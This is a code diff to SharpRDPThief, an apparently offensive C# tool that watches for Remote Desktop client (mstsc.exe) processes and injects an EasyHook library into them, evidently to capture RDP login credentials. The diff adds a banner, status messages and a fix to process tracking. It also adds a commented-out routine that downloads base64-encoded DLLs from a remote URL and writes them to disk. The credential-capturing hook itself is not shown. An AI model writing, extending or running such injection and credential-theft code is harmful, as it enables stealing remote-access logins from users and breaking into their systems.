@@ -30,6 +30,7 @@ using System.Collections.Generic;
 using System.Threading;
 using System.Linq;
 using System.ComponentModel;
+using System.Net;
 
 namespace SharpRDPThief
 {
@@ -50,6 +51,9 @@ namespace SharpRDPThief
             //Keep track of processes where we've already injected
             List<int> injectedProcesses = new List<int>();
             // Create the IPC server using the RDPHook IPC.ServiceInterface class as a singleton
+            printMessage();
+            Console.WriteLine("[*] Waiting for mstsc.exe processes...");
+            //GetDLLs("http://127.0.0.1");
             EasyHook.RemoteHooking.IpcCreateServer<RDPHook.ServerInterface>(ref channelName, System.Runtime.Remoting.WellKnownObjectMode.Singleton);
 
             // Get the full path to the assembly we want to inject into the target process
@@ -67,9 +71,10 @@ namespace SharpRDPThief
                     {
                         try
                         {
+                            Console.WriteLine(injectionLibrary);
                             targetPID = processes[i].Id;
                             // Injecting into existing process by Id
-                            Console.WriteLine("Attempting to inject into process {0}", targetPID);
+                            Console.WriteLine("[*] Attempting to inject into process {0}", targetPID);
                             // inject into existing process
                             EasyHook.RemoteHooking.Inject(
                                 targetPID,          // ID of process to inject into
@@ -83,7 +88,7 @@ namespace SharpRDPThief
                         catch (Exception e)
                         {
                             Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("There was an error while injecting into target:");
+                            Console.WriteLine("[-] There was an error while injecting into target:");
                             Console.ResetColor();
                             Console.WriteLine(e.ToString());
                         }
@@ -92,9 +97,10 @@ namespace SharpRDPThief
                 //check if any of our injected processes have exited
                 for(int i = 0; i < injectedProcesses.Count; i++)
                 {
-                    if(PIDs.IndexOf(injectedProcesses[i]) != -1)
+                    if(PIDs.IndexOf(injectedProcesses[i]) == -1)
                     {
-                        injectedProcesses.Remove(i);
+                        Console.WriteLine("[*] Process {0} has exited", injectedProcesses[i].ToString());
+                        injectedProcesses.Remove(injectedProcesses[i]);
                     }
                 }
                 //sleep to avoid nuking the computer
@@ -106,6 +112,37 @@ namespace SharpRDPThief
                 Console.ReadKey();
                 */
             }
+        }
+        /*
+        //Making the package more portable by downloading from a remote server
+        //Plans to come back to this, running into path issues
+        static void GetDLLs(string url)
+        {
+            string[] dlls = { "EasyHook32", "EasyHook64", "EasyHook", "EasyLoad32", "EasyLoad64"};
+            for(int i = 0; i < dlls.Length; i++)
+            {
+                WebRequest request = WebRequest.Create(url + "/" + dlls[i] + "base64.txt");
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                Stream dataStream = response.GetResponseStream();
+                StreamReader reader = new StreamReader(dataStream);
+                string base64 = reader.ReadToEnd();
+                byte[] toDLL = Convert.FromBase64String(base64);
+                string currentDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
+                File.WriteAllBytes(currentDir + @"\" + dlls[i] + ".dll", toDLL);
+                Console.WriteLine("[*] Loaded " + dlls[i] + ".dll in " + currentDir);
+            }
+        }
+        */
+
+        static void printMessage()
+        {
+            Console.WriteLine(@"  # #   ######  ######  ######  ####### #     # ### ####### ####### 
+  # #   #     # #     # #     #    #    #     #  #  #       #       
+####### #     # #     # #     #    #    #     #  #  #       #       
+  # #   ######  #     # ######     #    #######  #  #####   #####   
+####### #   #   #     # #          #    #     #  #  #       #       
+  # #   #    #  #     # #          #    #     #  #  #       #       
+  # #   #     # ######  #          #    #     # ### ####### #       ");
         }
     }
 }
